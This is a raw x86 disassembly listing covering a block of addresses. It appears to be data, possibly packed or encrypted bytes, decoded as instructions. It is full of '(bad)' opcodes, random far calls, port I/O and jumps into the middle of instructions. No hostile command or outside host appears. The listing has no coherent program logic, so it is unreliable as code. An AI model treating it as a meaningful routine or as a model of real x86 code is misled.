  415941:	je     0x415956
  415943:	inc    esp
  415944:	push   es
  415945:	ret    0x34
	...
  415970:	sub    ah,bl
  415972:	pop    ss
  415973:	xchg   DWORD PTR [eax+0x1a34dece],ebx
  415979:	sub    al,0x39
  41597b:	sub    al,0xc
  41597d:	adc    dh,0x34
  415980:	xchg   esp,eax
  415981:	loopne 0x41595a
  415983:	sub    al,0x2
  415985:	xlat   BYTE PTR ds:[ebx]
  415986:	push   ecx
  415987:	add    al,0xfb
  415989:	adc    BYTE PTR [eax-0x49290dd4],bh
  41598f:	scas   al,BYTE PTR es:[edi]
  415990:	pop    ss
  415991:	(bad)  
  415992:	xor    al,0xc
  415994:	hlt    
  415995:	ret    
  415996:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415997:	xor    al,0xda
  415999:	(bad)  
  41599a:	push   esp
  41599b:	xor    ecx,edx
  41599d:	(bad)  
  41599e:	xchg   esi,eax
  41599f:	sub    esp,ebp
  4159a1:	jge    0x415931
  4159a3:	xor    al,0xc2
  4159a5:	and    BYTE PTR [edi+0x28],bh
  4159a8:	stos   DWORD PTR es:[edi],eax
  4159a9:	(bad)  
  4159aa:	hlt    
  4159ab:	aaa    
  4159ac:	mov    ebx,0x1fdb00d4
  4159b1:	pop    ebx
  4159b2:	(bad)  
  4159b3:	stos   DWORD PTR es:[edi],eax
  4159b4:	sbb    ebx,DWORD PTR [ebx+0x53]
  4159b7:	jb     0x4159fc
  4159b9:	fcmovnb st,st(4)
  4159bb:	pop    ecx
  4159bc:	inc    eax
  4159bd:	aad    0xfd
  4159bf:	fs retf 0x50d2
  4159c3:	dec    esi
  4159c4:	mov    dl,0x66
  4159c6:	std    
  4159c7:	mov    esp,0xdbe1c323
  4159cc:	pop    ds
  4159cd:	pop    ebx
  4159ce:	or     DWORD PTR [ecx],ebp
  4159d0:	and    al,ah
  4159d2:	xchg   cl,ch
	...
  4159fc:	add    BYTE PTR [edi],bl
  4159fe:	pop    ebx
  4159ff:	lds    ebp,FWORD PTR [edi+edx*1+0x1fe9fdd6]
  415a06:	sahf   
  415a07:	inc    ebx
  415a08:	sbb    eax,0xe9005d10
  415a0d:	jne    0x4159e5
  415a0f:	addr16 jmp 0xe9a9309a
  415a15:	call   0xf4df:0xa299f41f
  415a1c:	imul   bh
  415a1e:	aam    0x50
  415a20:	out    0xd5,al
  415a22:	int    0xfd
  415a24:	push   esp
  415a25:	dec    esp
  415a26:	mov    esi,0x5b1ffbb3
  415a2b:	or     DWORD PTR [ecx+0x35e95bc4],ebp
  415a31:	cwde   
  415a32:	push   ss
  415a33:	dec    ecx
  415a34:	sub    BYTE PTR [eax],bl
  415a36:	(bad)  
  415a37:	jae    0x415a12
  415a39:	pop    es
  415a3a:	arpl   WORD PTR [edx],bp
  415a3c:	scas   al,BYTE PTR es:[edi]
  415a3d:	das    
  415a3e:	loope  0x415a10
  415a40:	je     0x4159e7
  415a42:	leave  
  415a43:	cmc    
  415a44:	sahf   
  415a45:	(bad)  
  415a47:	push   edx
  415a48:	sbb    esi,0xf8efd83
  415a4e:	dec    edi
  415a4f:	adc    al,0x0
  415a51:	adc    eax,0x322a4477
  415a56:	mov    cl,BYTE PTR [eax-0x16dda7b]
  415a5c:	push   DWORD PTR [edx]
  415a5e:	push   esp
  415a5f:	in     eax,dx
  415a60:	test   DWORD PTR [eax],0x0
	...
  415a8a:	add    cl,BYTE PTR [edx-0x777e8a02]
  415a90:	je     0x415a9a
  415a92:	(bad)  ds:0x89d2fffb
  415a98:	mov    ah,0xf0
  415a9a:	cmp    cl,BYTE PTR [edx-0x3c8a1702]
  415aa0:	(bad)  
  415aa1:	push   DWORD PTR [edx]
  415aa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415aa4:	cmc    
  415aa5:	jmp    0x415aa3
  415aa7:	mov    DWORD PTR [esp+edi*8+0x2d],esi
  415aab:	call   0x10bf:0x9645000f
  415ab2:	xor    eax,0xb6ec8ab2
  415ab7:	and    dl,BYTE PTR [ecx+0xa142257]
  415abd:	call   0x402e66
  415ac2:	sbb    DWORD PTR ds:[ebp+eax*1-0x6e],esi
  415ac7:	xchg   esi,eax
  415ac8:	mov    edi,0x4458051c
  415acd:	xchg   esp,eax
  415ace:	mov    cs,WORD PTR [ebx]
  415ad0:	sbb    cl,BYTE PTR [edi]
  415ad2:	stos   DWORD PTR es:[edi],eax
  415ad3:	mov    eax,ds:0x52e2500e
  415ad8:	inc    esi
  415ad9:	push   cs
  415ada:	adc    eax,0x47b658
  415adf:	test   eax,0x5b3ab60e
  415ae4:	push   eax
  415ae5:	packssdw mm4,QWORD PTR [ecx+0x52d2500a]
  415aec:	inc    esi
  415aed:	or     al,BYTE PTR [eax]
	...
  415b17:	adc    eax,0x1c47b658
  415b1c:	mov    ebx,0x7d8a0ed1
  415b21:	cld    
  415b22:	dec    edi
  415b23:	sub    edx,DWORD PTR [ebp-0x3ab3fa36]
  415b29:	jp     0x415b71
  415b2b:	and    BYTE PTR [edx+0x31],dh
  415b2e:	ss xor al,0x4b
  415b31:	mov    ah,0x40
  415b33:	sbb    al,0x4f
  415b35:	enter  0xec9b,0x29
  415b39:	dec    esp
  415b3a:	adc    BYTE PTR [edx+eax*8],bl
  415b3d:	xchg   bl,al
  415b3f:	dec    eax
  415b40:	inc    ecx
  415b41:	mov    al,0x1f
  415b43:	sbb    al,0x16
  415b45:	mov    ebp,0x32ade9fe
  415b4a:	je     0x415b58
  415b4c:	sbb    al,BYTE PTR [eax]
  415b4e:	arpl   WORD PTR ss:[ebp-0x182f4002],ax
  415b55:	jl     0x415b9b
  415b57:	mov    ah,0x75
  415b59:	mov    eax,0x9f74b07
  415b5e:	call   0xfe73fb39
  415b63:	cmp    edx,DWORD PTR [edi-0x6b]
  415b66:	(bad)  
  415b67:	test   eax,0xfea019b9
  415b6c:	int3   
  415b6d:	das    
  415b6e:	mov    ecx,ds
  415b70:	and    eax,0x5a91fed1
  415b75:	sbb    al,0x94
  415b77:	ds mov ch,0x2f
  415b7a:	inc    BYTE PTR [eax]
	...
  415ba4:	xchg   ecx,eax
  415ba5:	dec    edx
  415ba6:	das    
  415ba7:	je     0x415bcd
  415ba9:	call   0x742f:0x9cfb217e
  415bb0:	xchg   esp,eax
  415bb1:	test   eax,0xceb249f
  415bb6:	sbb    al,0x2f
  415bb8:	jecxz  0x415b48
  415bba:	cld    
  415bbb:	(bad)  
  415bbc:	push   ecx
  415bbd:	pop    ebx
  415bbe:	call   FWORD PTR [ebx]
  415bc0:	cs jns 0x415b61
  415bc3:	xor    edx,ecx
  415bc5:	dec    ebp
  415bc6:	jnp    0x415bf9
  415bc8:	dec    eax
  415bc9:	jae    0x415c4a
  415bcb:	sahf   
  415bcc:	std    
  415bcd:	rol    DWORD PTR [esi+0x17f7587f],cl
  415bd3:	xor    DWORD PTR [eax],esi
  415bd5:	jae    0x415c56
  415bd7:	sar    ch,cl
  415bd9:	shr    DWORD PTR [esi+0x31],cl
  415bdc:	adc    BYTE PTR [edi+0x66],ch
  415bdf:	mov    bh,0x23
  415be1:	aam    0xd4
  415be3:	or     esi,DWORD PTR [esi+edi*2+0x9]
  415be7:	xor    DWORD PTR [edx-0x7c682b2d],eax
  415bed:	lea    ecx,[ecx+esi*1]
  415bf0:	jb     0x415c25
  415bf2:	xor    BYTE PTR [esi+0x7],al
  415bf5:	pop    ebx
  415bf6:	pushf  
  415bf7:	jl     0x415c70
  415bf9:	fldenv [ebx]
  415bfb:	sub    BYTE PTR [esi-0x2d],cl
  415bfe:	es xor eax,ecx
  415c01:	jb     0x415c6f
  415c03:	xchg   DWORD PTR [ebx-0x31],ecx
  415c06:	push   ss
  415c07:	xor    DWORD PTR [eax],eax
	...
  415c31:	rcl    ebx,cl
  415c33:	xchg   esp,eax
  415c34:	sti    
  415c35:	inc    ebx
  415c36:	xor    dl,BYTE PTR [ecx+esi*1+0x32]
  415c3a:	shl    DWORD PTR [ebx+ecx*1-0x67],cl
  415c3e:	fucom  st(7)
  415c40:	sub    esp,DWORD PTR [edx]
  415c42:	rcl    DWORD PTR [edi-0x19a06fd0],cl
  415c48:	mov    dh,0x1b
  415c4a:	ret    
  415c4b:	ins    DWORD PTR es:[edi],dx
  415c4c:	pop    esi
  415c4d:	or     dl,bl
  415c4f:	inc    ecx
  415c50:	add    al,0x76
  415c52:	pop    ebx
  415c53:	aas    
  415c54:	xor    DWORD PTR [esi],ebx
  415c56:	pop    ebx
  415c57:	out    0x7e,eax
  415c59:	cwde   
  415c5a:	pop    ebx
  415c5b:	mov    bl,0x30
  415c5d:	jmp    0x73d1:0x2d43002b
  415c64:	fnstcw WORD PTR [ecx+0x37e967d2]
  415c6a:	test   BYTE PTR [eax],dl
  415c6c:	jmp    0x99c4f690
  415c71:	or     cl,dl
  415c73:	std    
  415c74:	stc    
  415c75:	pop    ds
  415c76:	pop    ebx
  415c77:	add    BYTE PTR [esi+0x7ef1ce9a],ch
  415c7d:	in     al,dx
  415c7e:	pop    ebx
  415c7f:	add    cl,ch
  415c81:	pop    ds
  415c82:	call   0xe9fd:0xd1507183
  415c89:	pop    ds
  415c8a:	pop    ebx
  415c8b:	add    BYTE PTR [esi],ah
  415c8d:	mov    ds:0x4c56f1d6,al
  415c92:	sar    ch,cl
  415c94:	jmp    0x415c99
	...
  415cbd:	add    BYTE PTR [edi],bl
  415cbf:	out    0x53,al
  415cc1:	loope  0x415cb3
  415cc3:	imul   ebp,DWORD PTR [edx-0x17],0xffffffea
  415cc7:	(bad)  
  415cc8:	lock cmp ch,BYTE PTR [ecx+edx*8]
  415ccc:	push   eax
  415ccd:	pop    esp
  415cce:	mov    ds:0xc26f1c6,al
  415cd3:	and    cl,BYTE PTR [ebx-0x232d89c]
  415cd9:	push   ss
  415cda:	outs   dx,DWORD PTR ds:[esi]
  415cdb:	shl    DWORD PTR [ebx-0x7],1
  415cde:	in     al,dx
  415cdf:	inc    esi
  415ce0:	or     al,0x6
  415ce2:	push   0x5a
  415ce4:	push   0xffffffe9
  415ce6:	in     al,dx
  415ce7:	inc    esi
  415ce8:	sbb    dh,dh
  415cea:	dec    eax
  415ceb:	push   ds
  415cec:	sub    DWORD PTR [edi+esi*1],0x18e6fdcd
  415cf3:	bound  eax,QWORD PTR [esp+edx*8+0x6a005b20]
  415cfa:	(bad)  
  415cfb:	(bad)  
  415cfc:	icebp  
  415cfd:	into   
  415cfe:	dec    ebx
  415cff:	ror    BYTE PTR [esi],cl
  415d01:	add    BYTE PTR [ecx-0xa000291],al
  415d07:	cmc    
  415d08:	xchg   esi,eax
  415d09:	jno    0x415d3f
  415d0b:	push   edi
  415d0c:	mov    eax,DWORD PTR [ebp-0x17e3b]
  415d12:	adc    eax,0xb50fd76f
  415d17:	pop    ebp
  415d18:	add    eax,0x21
  415d1b:	pusha  
  415d1c:	push   0xfd9814a6
  415d21:	mov    WORD PTR [eax],es
	...
  415d4b:	inc    eax
  415d4c:	push   edi
  415d4d:	cld    
  415d4e:	jmp    FWORD PTR [edx]
  415d50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d51:	in     eax,0xc5
  415d53:	mov    edx,0xc585005d
  415d58:	rol    DWORD PTR [edi+ebp*4-0x38ffa27b],1
  415d5f:	add    BYTE PTR [ebx+0x63eafff2],al
  415d65:	add    bh,ch
  415d67:	stos   DWORD PTR es:[edi],eax
  415d68:	out    dx,al
  415d69:	scas   eax,DWORD PTR es:[edi]
  415d6a:	jno    0x415d30
  415d6c:	pop    ebp
  415d6d:	mov    eax,DWORD PTR [ebp-0x17a8b]
  415d73:	test   DWORD PTR [ebp-0x61],esi
  415d76:	cmovne ebx,DWORD PTR [ebp-0x7d]
  415d7a:	shl    BYTE PTR [ecx+0x2185c6bf],0x8e
  415d81:	(bad)  
  415d82:	push   DWORD PTR [ebx]
  415d84:	pop    ebp
  415d85:	in     eax,dx
  415d86:	mov    esi,0x4170919d
  415d8b:	inc    ebp
  415d8c:	fiadd  DWORD PTR [eax+eax*1+0x50fe821d]
  415d93:	sbb    eax,0x5000ede
  415d98:	in     al,0xbd
  415d9a:	je     0x415db6
  415d9c:	sbb    BYTE PTR [esp+eiz*8+0x7fe81e6],al
  415da3:	sbb    al,0xc2
  415da5:	push   ds
  415da6:	mov    ebp,0x40b51084
  415dab:	sbb    al,0x47
  415dad:	mov    bh,bh
	...
  415dd7:	add    bl,dh
  415dd9:	adc    DWORD PTR [edi],ebp
  415ddb:	dec    edi
  415ddc:	hlt    
  415ddd:	push   ds
  415dde:	std    
  415ddf:	(bad)  
  415de0:	(bad)  [edi]
  415de2:	inc    ecx
  415de3:	je     0x415e53
  415de5:	inc    ebx
  415de6:	jo     0x415dcb
  415de8:	iret   
  415de9:	icebp  
  415dea:	cs push es
  415dec:	sbb    al,0xd9
  415dee:	imul   esi,DWORD PTR [eax+eax*1+0x5c],0x4
  415df3:	jmp    FWORD PTR [ecx]
  415df5:	(bad)  
  415df6:	cs je  0x415e09
  415df9:	push   ecx
  415dfa:	js     0x415de3
  415dfc:	scas   eax,DWORD PTR es:[edi]
  415dfd:	dec    ecx
  415dfe:	cs (bad) 
  415e00:	ror    DWORD PTR [esi+0x32],1
  415e03:	(bad)  
  415e04:	xchg   ebx,eax
  415e05:	cmp    DWORD PTR [eax+0x25e78b0f],edi
  415e0b:	repnz sub DWORD PTR [ecx],0x19
  415e0f:	call   0xac3e:0xea2e2179
  415e16:	add    al,0xff
  415e18:	icebp  
  415e19:	mov    ebp,0x8908742e
  415e1e:	js     0x415e07
  415e20:	dec    edi
  415e21:	sub    DWORD PTR [esi],0x326689fe
  415e27:	dec    BYTE PTR [ebx+0x71]
  415e2a:	mov    eax,0x252f430f
  415e2f:	repnz cmp esp,DWORD PTR [ecx+0x19]
  415e33:	jbe    0x415e66
  415e35:	pop    ecx
  415e36:	cs (bad) 
  415e38:	jno    0x415e98
  415e3a:	xor    bh,dh
	...
  415e64:	add    BYTE PTR [ebx],ah
  415e66:	pop    edx
  415e67:	xchg   edx,eax
  415e68:	push   cs
  415e69:	sbb    al,0xc2
  415e6b:	cmp    al,0xc1
  415e6d:	sub    BYTE PTR [ebx-0x19],bl
  415e70:	(bad)  
  415e71:	xchg   esi,eax
  415e72:	mov    esi,0xdc07486a
  415e77:	adc    al,0x51
  415e79:	data16 sbb ah,bh
  415e7c:	add    ebp,DWORD PTR [eax-0x70]
  415e7f:	scas   al,BYTE PTR es:[edi]
  415e80:	(bad)  
  415e81:	out    0x5a,eax
  415e83:	out    0x3,eax
  415e85:	sbb    al,0x84
  415e87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e88:	aam    0x6b
  415e8a:	sub    ebx,DWORD PTR [edi+edx*8-0x29]
  415e8e:	sub    al,0xa6
  415e90:	pop    ss
  415e91:	out    dx,eax
  415e92:	and    ebp,DWORD PTR [eax]
  415e94:	add    al,0x99
  415e96:	call   0xaf6a:0x7bc70210
  415e9d:	mov    bh,0x5a
  415e9f:	cld    
  415ea0:	add    DWORD PTR [edi-0x514bf08d],esi
  415ea6:	sbb    ah,bh
  415ea8:	sub    al,0x10
  415eaa:	iret   
  415eab:	outs   dx,BYTE PTR ds:[esi]
  415eac:	mov    bh,0x1b
  415eae:	ret    
  415eaf:	and    ebx,DWORD PTR [edi-0x76]
  415eb2:	iret   
  415eb3:	jb     0x415e8c
  415eb5:	xchg   ebx,esp
  415eb7:	stc    
  415eb8:	sub    al,0xf0
  415eba:	into   
  415ebb:	dec    esi
  415ebc:	rcr    BYTE PTR [ebx],cl
  415ebe:	mov    ds:0x261c0829,al
  415ec3:	jb     0x415ee5
  415ec5:	sahf   
  415ec6:	xchg   esi,eax
  415ec7:	xor    ebx,DWORD PTR [edx+0x0]
	...
  415ef1:	add    BYTE PTR [ebx+0x41],bl
  415ef4:	lea    ebp,[eax+ecx*8]
  415ef7:	bound  ecx,QWORD PTR [edi]
  415ef9:	leave  
  415efa:	sub    edx,eax
  415efc:	push   ds
  415efd:	jnp    0x415ed7
  415eff:	into   
  415f00:	push   ss
  415f01:	mov    bh,0x23
  415f03:	ret    
  415f04:	js     0x415f33
  415f06:	xor    cl,bh
  415f08:	(bad)  
  415f09:	stc    
  415f0a:	mov    ebx,0xe82ce719
  415f0f:	mov    ecx,0xcedea100
  415f14:	(bad)  
  415f15:	je     0x415f2e
  415f17:	mov    bh,0x9b
  415f19:	loop   0x415f53
  415f1b:	int    0x68
  415f1d:	repz iret 
  415f1f:	sbb    eax,DWORD PTR [eax]
  415f21:	inc    ecx
  415f22:	mov    edx,DWORD PTR [esi]
  415f24:	aas    
  415f25:	jmp    0xc6684641
  415f2a:	cmp    BYTE PTR [esi],bl
  415f2c:	push   eax
  415f2d:	push   ecx
  415f2e:	icebp  
  415f2f:	ds aas 
  415f31:	jmp    0x2220e63e
  415f36:	(bad)  
  415f38:	(bad)  
  415f39:	sbb    al,0xc8
  415f3b:	mov    dh,0x18
  415f3d:	popf   
  415f3e:	lock int3 
  415f40:	call   0xfe0f1cfa
  415f45:	add    ebx,DWORD PTR [eax]
  415f47:	inc    ebx
  415f48:	cmp    eax,0xffffffde
  415f4b:	into   
  415f4c:	and    BYTE PTR gs:[edi+0x1b],ch
  415f50:	add    BYTE PTR [ecx],al
  415f52:	push   ds
  415f53:	pop    ebx
  415f54:	add    BYTE PTR [ecx+0x0],ch
	...
  415f7f:	aaa    
  415f80:	mov    al,0x23
  415f82:	data16 cmp BYTE PTR [ecx-0x40],ah
  415f86:	aad    0x7f
  415f88:	ss mov ebx,eax
  415f8b:	pop    esi
  415f8c:	into   
  415f8d:	dec    ebp
  415f8e:	inc    ecx
  415f8f:	aad    0x77
  415f91:	std    
  415f92:	inc    esi
  415f93:	dec    edi
  415f94:	push   ds
  415f95:	std    
  415f96:	hlt    
  415f97:	ds push ss
  415f99:	aas    
  415f9a:	jmp    0x4149a6a7
  415f9f:	inc    eax
  415fa0:	sar    ebp,1
  415fa2:	es daa 
  415fa4:	cld    
  415fa5:	and    bl,BYTE PTR [esi]
  415fa7:	lock xor eax,0xce5e994a
  415fad:	(bad)  
  415fae:	aam    0xfe
  415fb0:	adc    eax,0x7f35003f
  415fb5:	je     0x415fbf
  415fb7:	or     eax,0x12fffab7
  415fbc:	repz std 
  415fbe:	addr16 jl 0x415fcb
  415fc1:	inc    ecx
  415fc2:	add    BYTE PTR [edx],al
  415fc4:	int3   
  415fc5:	loopne 0x41600f
  415fc7:	xor    al,0x57
  415fc9:	std    
  415fca:	jne    0x415fc9
  415fcc:	jno    0x415f7e
  415fce:	sti    
  415fcf:	loop   0x415f52
  415fd1:	add    BYTE PTR [di-0x7e],cl
  415fd5:	ins    DWORD PTR es:[edi],dx
  415fd6:	inc    ecx
  415fd7:	cmc    
  415fd8:	xor    BYTE PTR [ecx+eiz*8],0xfd
  415fdc:	xchg   edi,eax
  415fdd:	std    
  415fde:	dec    BYTE PTR [eax]
  415fe0:	iret   
  415fe1:	in     eax,0x9c
	...
  41600b:	add    BYTE PTR [esi-0x7f],bh
  41600e:	(bad)  
  41600f:	jmp    FWORD PTR [eax]
  416011:	cmp    esi,0x75
  416014:	mov    ebp,0xa21fd571
  416019:	or     eax,0x5359b9c2
  41601f:	mov    edx,DWORD PTR [ecx+0x13f4c1d7]
  416025:	cmp    dh,0x6a
  416028:	test   edi,ebp
  41602a:	pop    esi
  41602b:	jmp    FWORD PTR [eax-0x2f]
  41602e:	in     eax,0x79
  416030:	add    BYTE PTR [eax+0x75c889fe],0xc6
  416037:	add    eax,0x40f69d
  41603c:	ja     0x416097
  41603e:	add    BYTE PTR [eax],al
  416040:	lock fcomi st,st(6)
  416043:	(bad)  
  416044:	adc    al,BYTE PTR [edx+0x5639684d]
  41604a:	add    BYTE PTR [eax],al
  41604c:	sub    eax,0x35000c76
  416051:	icebp  
  416052:	xor    eax,0x2031c72
  416057:	push   0xffc4f200
  41605c:	ret    
  41605d:	dec    edx
  41605e:	mov    ds:0xf0cd1c40,eax
  416063:	loopne 0x4160c9
  416065:	add    eax,DWORD PTR [edx]
  416067:	dec    DWORD PTR [ecx-0x4024e646]
  41606d:	mov    ch,0x2a
  41606f:	add    BYTE PTR [bx+si],al
	...
  416096:	add    BYTE PTR [eax],al
  416098:	add    BYTE PTR [eax+esi*1-0x3d],al
  41609c:	inc    DWORD PTR [ebx+0x1c40b656]
  4160a2:	sbb    bh,BYTE PTR [ebx+0x60]
  4160a5:	pop    ebp
  4160a6:	ret    0x199
  4160a9:	sbb    al,0xc2
  4160ab:	cmp    esi,0xbf19ba51
  4160b1:	jg     0x4160b0
  4160b3:	sub    cl,BYTE PTR [ecx+eiz*4-0x3c01d813]
  4160ba:	xchg   edx,eax
  4160bb:	sbb    al,0x8b
  4160bd:	sub    edx,eax
  4160bf:	add    edi,eax
  4160c1:	sbb    DWORD PTR [edx],ebx
  4160c3:	mov    eax,ds:0x1c11c40
  4160c8:	add    BYTE PTR [edi+edi*1],bl
  4160cb:	xor    dh,0x9a
  4160ce:	inc    ebp
  4160cf:	sub    cl,BYTE PTR [edi+0x4]
  4160d2:	mov    dh,0x4
  4160d4:	add    BYTE PTR [edx+ebp*1],bl
  4160d7:	xchg   BYTE PTR [esp+ebx*1],cl
  4160da:	ret    0x3799
  4160dd:	out    dx,al
  4160de:	add    al,BYTE PTR [edx]
  4160e0:	push   0xffc4b040
  4160e5:	add    ecx,DWORD PTR [ebx-0x5c]
  4160e8:	inc    eax
  4160e9:	sbb    al,0x8d
  4160eb:	lock loopne 0x4160d2
  4160ee:	add    al,BYTE PTR [edx]
  4160f0:	dec    ecx
  4160f2:	mov    ecx,0x5b7f7b19
  4160f7:	sub    bh,BYTE PTR es:[ebx+0xc49992]
	...
  416126:	cmp    esi,DWORD PTR [ebx+eax*8]
  416129:	mov    ch,0xdc
  41612b:	pop    edx
  41612c:	jg     0x4161aa
  41612e:	mov    esp,0x1d9be719
  416133:	pop    ebx
  416134:	out    0x83,eax
  416136:	sbb    al,BYTE PTR [esi-0x21]
  416139:	sbb    esi,DWORD PTR [ebx-0x8]
  41613c:	out    dx,al
  41613d:	sub    DWORD PTR [eax+0x22aded5],ebx
  416143:	int3   
  416144:	aaa    
  416145:	sbb    al,0x47
  416147:	pop    esi
  416148:	out    0x3,eax
  41614a:	repz inc ebp
  41614c:	retf   
  41614d:	sub    DWORD PTR [eax+0x63],esi
  416150:	iret   
  416151:	xor    eax,DWORD PTR [ecx]
  416153:	int3   
  416154:	mov    esi,0xe756dd3b
  416159:	into   
  41615a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41615b:	mov    esi,0x23c7406a
  416160:	aaa    
  416161:	int3   
  416162:	cmp    edx,DWORD PTR [edi]
  416164:	xchg   esi,eax
  416165:	les    edi,FWORD PTR [ebx-0x20fce63d]
  41616b:	retf   
  41616c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41616d:	mov    edi,0x3e75aa7
  416172:	sbb    al,0xc
  416174:	and    eax,0x765adcb6
  416179:	scas   eax,DWORD PTR es:[edi]
  41617a:	sbb    ebx,esp
  41617c:	in     al,0x36
  41617e:	push   cs
  41617f:	sbb    ah,bh
  416181:	lahf   
  416182:	mov    esp,0x1c03e78a
  416187:	fcmovne st,st(7)
  416189:	add    eax,0x0
	...
  4161b2:	add    BYTE PTR [edi+eax*2],bl
  4161b5:	fild   QWORD PTR [eax]
  4161b7:	lock bound ecx,QWORD PTR [edi+0x76]
  4161bb:	or     ecx,esp
  4161bd:	sbb    edx,DWORD PTR ds:[ebx+0x1fe9005a]
  4161c4:	ret    
  4161c5:	fiadd  DWORD PTR [ebx]
  4161c7:	cmc    
  4161c8:	int3   
  4161c9:	std    
  4161ca:	pushf  
  4161cb:	inc    edi
  4161cc:	mov    bl,0x89
  4161ce:	cld    
  4161cf:	add    al,0xcd
  4161d1:	mov    eax,ds:0x1a6920
  4161d6:	test   esp,esi
  4161d8:	xchg   BYTE PTR [eax],al
  4161da:	jmp    0x25cabcfe
  4161df:	mov    esp,0x1fe933c9
  4161e4:	pop    ebx
  4161e5:	add    BYTE PTR [edi+ebp*8-0x201edfbe],dl
  4161ec:	retf   0xc065
  4161ef:	sub    al,0x8a
  4161f1:	add    BYTE PTR [ecx],bh
  4161f3:	mov    esp,0x1fe923d3
  4161f8:	pop    ebx
  4161f9:	add    dh,al
  4161fb:	mov    dl,0x62
  4161fd:	std    
  4161fe:	(bad)  
  4161ff:	sahf   
  416200:	mov    DWORD PTR [esi],edi
  416202:	sub    eax,0xce71cad8
  416207:	mov    al,ds:0xc71d10d2
  41620c:	mov    eax,ds:0x5b1e9d43
  416211:	add    cl,ch
  416213:	adc    BYTE PTR [ebx-0x3],ch
  416216:	aam    0x0
	...
  416240:	out    0x4c,al
  416242:	aas    
  416243:	jmp    0xfb0cf13c
  416248:	pop    esi
  416249:	retf   0x7de5
  41624c:	and    edx,ecx
  41624e:	std    
  41624f:	push   0x4b
  416251:	jb     0x41623c
  416253:	scas   al,BYTE PTR es:[edi]
  416254:	push   edx
  416255:	aad    0xec
  416257:	jb     0x4162c3
  416259:	push   esi
  41625a:	mov    DWORD PTR [edi+ecx*1-0x1b1e8d36],ebp
  416261:	dec    ecx
  416262:	mov    eax,0x5e7500
  416267:	call   DWORD PTR [edi+0x1808ed2]
  41626d:	pop    esi
  41626e:	add    BYTE PTR [eax],al
  416270:	cli    
  416271:	femms  
  416273:	(bad)  
  416274:	mov    ch,0x39
  416276:	std    
  416277:	inc    DWORD PTR [ebp-0x21]
  41627a:	cmp    al,0xcd
  41627c:	xchg   esi,eax
  41627d:	popf   
  41627e:	std    
  41627f:	call   DWORD PTR [ecx-0x13ca0293]
  416285:	push   cs
  416286:	inc    ecx
  416287:	add    BYTE PTR [edx],bl
  416289:	mov    eax,0x5dc473cc
  41628e:	call   0xfeb45244
  416293:	mov    eax,0x5df5
  416298:	cmp    BYTE PTR ds:0x52610021,bl
  41629e:	add    al,0x0
  4162a0:	cmc    
  4162a1:	pop    ebp
  4162a2:	add    BYTE PTR [ebx+0x0],al
	...
  4162cc:	add    BYTE PTR [edx-0x3ac07ea6],dh
  4162d2:	rol    BYTE PTR [edi+edi*1-0x74017e76],1
  4162d9:	add    BYTE PTR [ebx+0x5e],dh
  4162dc:	leave  
  4162dd:	ja     0x416339
  4162df:	add    BYTE PTR [ebp+0x2e],dl
  4162e2:	arpl   WORD PTR [edx+0x4d9889c4],ax
  4162e8:	pop    eax
  4162e9:	sbb    eax,0xb540f611
  4162ee:	jne    0x41635f
  4162f0:	add    esi,eax
  4162f2:	or     DWORD PTR [edx+0x2a87fec9],0x6587fef6
  4162fc:	cli    
  4162fd:	pop    edx
  4162fe:	mov    ebx,0x522c8b00
  416303:	inc    esp
  416304:	cld    
  416305:	sbb    al,0x3d
  416307:	cmp    ebp,edx
  416309:	push   es
  41630a:	cmp    eax,0x4c5a023b
  41630f:	cmp    ecx,DWORD PTR [edi-0x59]
  416312:	mov    bl,BYTE PTR [edi+edi*8]
  416315:	daa    
  416316:	mov    ah,0x1
  416318:	mov    edx,DWORD PTR [ebp-0x15]
  41631b:	jp     0x4162e5
  41631d:	pop    ds
  41631e:	jbe    0x416399
  416320:	enter  0xf63b,0x25
  416324:	xor    BYTE PTR [ecx+0x3c75046f],0xf9
  41632b:	cmp    al,0xc2
  41632d:	leave  
  41632e:	dec    esp
  41632f:	sbb    BYTE PTR [edi+0x0],cl
	...
  41635a:	je     0x416346
  41635c:	mov    esi,edi
  41635e:	pop    esp
  41635f:	mov    dl,0x29
  416361:	jno    0x416380
  416363:	jne    0x41638a
  416365:	mov    bl,BYTE PTR [ecx-0x36]
  416368:	cli    
  416369:	mov    edi,0x41ab670
  41636e:	repnz mov edx,0x325c0723
  416374:	jmp    0x3d49cc78
  416379:	shl    DWORD PTR [eax],0xb2
  41637c:	ror    BYTE PTR [edx-0xcc2ca40],1
  416382:	outs   dx,DWORD PTR ds:[esi]
  416383:	(bad)  
  416384:	int3   
  416385:	addr16 fdiv st(2),st
  416388:	sar    edi,0xb3
  41638b:	fs add eax,ebx
  41638e:	mov    bl,0xf9
  416390:	shl    bl,0x1c
  416393:	mov    dl,0x1
  416395:	add    bh,dh
  416397:	cld    
  416398:	js     0x4163de
  41639a:	cwde   
  41639b:	bound  esp,QWORD PTR ds:0x3eda2474
  4163a1:	or     bl,BYTE PTR [edx+esi*4]
  4163a4:	cmp    BYTE PTR [edi+0x271c5b04],0xf0
  4163ab:	push   edx
  4163ac:	dec    edi
  4163ad:	mov    cl,BYTE PTR [edx]
  4163af:	enter  0x7c56,0xe0
  4163b3:	ret    0xd3a7
  4163b6:	jnp    0x41634f
  4163b8:	out    0x26,al
  4163ba:	pop    edx
  4163bb:	shl    BYTE PTR [edi+ebp*1+0x0],cl
	...
  4163e6:	add    BYTE PTR [edx+0x4e],dl
  4163e9:	xor    ebx,DWORD PTR [ebx]
  4163eb:	mov    eax,ds:0x1703e755
  4163f0:	fwait
  4163f1:	fwait
  4163f2:	(bad)  
  4163f4:	dec    esi
  4163f5:	pop    ds
  4163f6:	es test al,0xce
  4163f9:	mov    bh,0x1b
  4163fb:	inc    ebx
  4163fc:	push   0x4e22260e
  416401:	add    ebx,DWORD PTR [ebx]
  416403:	(bad)  
  416404:	push   ebp
  416405:	out    0x3,eax
  416407:	adc    ecx,DWORD PTR [esi-0x21]
  41640a:	sbb    ecx,DWORD PTR [edi-0x61da119e]
  416410:	inc    ebp
  416411:	fild   DWORD PTR [eax+esi*2]
  416414:	imul   ecx,DWORD PTR [edi+0x1f],0x24e71a6e
  41641b:	jo     0x4163ec
  41641d:	mov    edi,0xe75b1619
  416422:	clc    
  416423:	fwait
  416424:	dec    esi
